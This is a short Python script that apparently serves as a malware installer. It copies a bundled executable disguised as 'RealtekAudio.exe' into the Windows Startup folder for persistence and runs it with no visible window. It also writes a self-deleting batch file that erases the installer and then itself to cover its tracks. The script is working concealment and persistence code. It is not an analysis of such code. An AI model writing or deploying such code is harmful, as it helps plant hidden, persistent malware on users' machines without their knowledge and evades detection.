import os
import subprocess 

def scheduling():
    script_path = os.path.abspath("install.exe")
    bat_path = script_path + ".bat"
    
    bat_content = f"""@echo off
timeout /T 3 /NOBREAK > nul
del "{script_path}"
del "%~f0"
"""
    with open(bat_path, "w") as f:
        f.write(bat_content)
    
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "RealtekAudio.exe")
    subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

    subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)

def install():
    bundle_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(bundle_dir, "RealtekAudio.exe")
    username = os.path.basename(os.environ["USERPROFILE"])
    destination_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RealtekAudio.exe"

    with open(exe_path, "rb") as f:
        data = f.read()

    with open(destination_path, "wb") as f:
        f.write(data)

    scheduling()
    
if __name__ == "__main__":
    install()